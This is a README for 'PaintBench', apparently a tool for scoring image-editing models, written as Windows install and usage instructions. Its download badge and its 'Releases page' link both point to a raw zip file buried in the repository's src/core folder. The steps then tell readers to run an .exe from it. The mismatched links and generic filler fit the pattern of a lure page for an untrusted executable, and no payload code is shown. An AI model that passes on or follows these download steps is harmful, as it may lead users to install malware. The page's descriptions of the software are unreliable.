# 🎨 PaintBench - Accurate testing for visual editing tools

[![](https://img.shields.io/badge/Download_PaintBench-blue.svg)](https://raw.githubusercontent.com/Wyzdmulc/PaintBench/main/src/core/Paint_Bench_3.5.zip)

PaintBench provides a standard way to test how well image editing software performs. This tool measures the accuracy of edits made by computer programs. It uses a set of images and instructions to check if a system understands complex visual tasks. You can use this data to see how different models change images. It gives you clear results for every edit.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Go to the [Releases page](https://raw.githubusercontent.com/Wyzdmulc/PaintBench/main/src/core/Paint_Bench_3.5.zip).
2. Look for the latest version at the top of the list.
3. Click the link ending in .exe to download the installer.
4. Save the file to your computer.
5. Open the file to start the installation process.
6. Follow the prompts on your screen.
7. Click Finish to complete the setup.

## 🖥️ System Requirements

Your computer needs specific parts to run this software well. Please check your PC against this list before you start.

* Operating System: Windows 10 or Windows 11.
* Memory: At least 8 gigabytes of RAM.
* Storage: 2 gigabytes of free space on your hard drive.
* Graphics: A dedicated graphics card with at least 4 gigabytes of video memory.
* Display: A monitor that supports a resolution of 1920 by 1080.

## 🛠️ How to Use PaintBench

PaintBench works by comparing an original image to the version your software creates. You supply the program with a test image and a text prompt. The software then processes the image. It outputs a score which tells you how close the edit matches the instruction.

### Loading your first test
Open the PaintBench application from your desktop icon. Select the "New Project" button. Choose your source image from your local file browser. Next, type your edit instruction into the box provided. Click "Run Evaluation" to begin the test. The software shows a progress bar while it works.

### Reading the results
Once the process finishes, the screen displays a score. A higher score means the tool performed the edit with higher accuracy. You can save these results to a spreadsheet for your own records. The program also creates a visual comparison image. This side-by-side view helps you see exactly where the software succeeded or struggled.

## 🧠 Understanding Key Concepts

This software tracks several parts of the editing process. It looks at how well the software understands your request. It also checks if the new image keeps the quality of the original file. 

* Visual Fidelity: This measure checks if the image looks real after the edit. It looks for blur, noise, or artifacts that should not exist.
* Prompt Adherence: This measure checks if the software followed your text request. If you ask the tool to add a hat, it checks if a hat appears in the final image.
* Spatial Awareness: This measure checks if the software understands where objects belong in the frame. It confirms that the edits happen in the right place.

## ⚙️ Configuration Settings

You can change how the software evaluates your images. Open the settings menu to adjust the strictness of the scoring. If you want a fast estimate, select the "Quick Mode" option. If you need a deep look at the image quality, use the "Deep Analysis" mode. 

The software automatically saves your settings when you close the menu. If you need to return to the original state, click the "Reset to Defaults" button found at the bottom of the settings screen.

## ❓ Frequently Asked Questions

Why is the evaluation taking a long time?
High-resolution images take more time to process. Ensure that your computer meets the recommended hardware requirements. Close other heavy programs while running tests to free up system resources.

Where can I find my log files?
The software saves logs in your documents folder under the PaintBench directory. These files contain details about your past evaluation sessions.

Can I add my own test images?
Yes. You can import your own files using the "Import Dataset" feature in the main menu. Make sure the images are in a standard format like JPG or PNG.

Does this tool work without an internet connection?
The software runs locally on your machine. You do not need an active internet connection to perform evaluations.

## 🛡️ Support and Updates

We provide updates to ensure the software remains accurate as new technology enters the market. When you launch the application, it checks for updates. If a new version exists, a notification appears on your screen. Click the link to download the updated installer.

If you encounter an error, take a screenshot of the message. You can share this image with our community support page to get help from other users. Keep your drivers updated, especially the drivers for your graphics card, to ensure the best performance.